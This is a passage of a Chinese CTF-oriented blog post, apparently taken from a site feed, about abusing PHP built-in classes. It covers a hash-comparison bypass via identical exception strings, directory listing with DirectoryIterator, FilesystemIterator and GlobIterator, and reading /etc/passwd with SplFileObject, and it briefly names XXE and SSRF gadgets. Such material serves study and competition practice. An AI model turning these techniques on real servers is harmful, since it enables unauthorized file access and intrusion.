href="#Hash绕过">¶</a>Hash绕过</h3><p>这两个异常对象是不同的（异常代码不同）但<code>__toString()</code>方法的输出的结果一模一样**<em>__toString 返回的数据包含当前行号**</em>所以要在同一行写该类调用</p><p>例题: <a href="https://so.csdn.net/so/search?q=%5B2020%20%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%5DGreatphp&amp;t=&amp;u=&amp;urw=">[2020 极客大挑战]Greatphp</a></p><h2 id="内置类读目录-文件"><a class="header-anchor" href="#内置类读目录-文件">¶</a>内置类读目录, 文件</h2><ul><li>Directorylterator (PHP 5, PHP 7, PHP 8)DirectoryIterator与glob://协议结合可以进行目录读取, 显示出当前目录下的文件信息</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取到根目录的文件</span></span><br><span class="line"><span class="built_in">DirectoryIterator</span>(glob:<span class="comment">///*);</span></span><br></pre></td></tr></table></figure><ul><li>FilesystemIterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)FilesystemIterator继承自DirectoryIterator,基本是一样的语法, 但这个类会以绝对路径形式展现</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 root 下文件</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span>(glob:<span class="comment">///root/*);</span></span><br></pre></td></tr></table></figure><ul><li>Globlterator (PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)和上面两个差不多, 以绝对路径形式展现, 可以通过模式匹配来寻找文件路径</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 bin 下的文件</span></span><br><span class="line"><span class="title function_ invoke__">Globlterator</span>(/bin<span class="comment">/*);</span></span><br></pre></td></tr></table></figure><ul><li>SplFileObject (PHP 5 &gt;= 5.1.0, PHP 7, PHP 8)读取文件内容</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取 /etc/passwd 文件内容</span></span><br><span class="line"><span class="built_in">SplFileObject</span>(/etc/passwd);</span><br></pre></td></tr></table></figure><h2 id="SimpleXMLElement-XXE"><a class="header-anchor" href="#SimpleXMLElement-XXE">¶</a>SimpleXMLElement - XXE</h2><p>远程包含xml文件</p><h2 id="SoapClient-SSRF"><a class="header-anchor" href="#SoapClient-SSRF">¶</a>SoapClient - SSRF</h2><p>适用于 PHP 5、PHP 7、PHP 8, 只局限于http、https协议</p><h2 id="ReflectionMethod-获取注释内容"><a class="header-anchor" href="#ReflectionMethod-获取注释内容">¶</a>ReflectionMethod - 获取注释内容</h2><p>适用于 PHP 5 &gt;= 5.1.0, PHP 7, PHP 8<code>ReflectionFunction</code> 类的 <code>getDocComment()</code> 方法可以获取注释内容</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
         </tags>
       
